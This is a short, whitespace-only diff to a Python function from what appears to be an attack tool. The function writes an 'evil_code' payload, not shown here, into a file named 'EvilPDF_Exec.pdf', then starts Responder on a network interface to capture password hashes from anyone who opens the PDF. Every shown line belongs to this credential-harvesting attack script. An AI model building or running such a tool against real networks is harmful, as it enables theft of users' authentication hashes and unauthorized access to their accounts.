@@ -68,12 +68,12 @@ trailer
 """
 def run():
 	try:
-    	text("Creating PDF...")
-    	pdf = open("EvilPDF_Exec.pdf", "w")
+		text("Creating PDF...")
+		pdf = open("EvilPDF_Exec.pdf", "w")
 		pdf.write(evil_code)
-    	pdf.close()
-    	text("Saved as: EvilPDF_Exec.pdf")
-    	text("Starting up responder to get hashes")
-    	os.system("/usr/bin/responder -I " + init['interface'] + " -wF")
+		pdf.close()
+		text("Saved as: EvilPDF_Exec.pdf")
+		text("Starting up responder to get hashes")
+		os.system("/usr/bin/responder -I " + init['interface'] + " -wF")
 	except KeyboardInterrupt:
-    	exit()
+		exit()
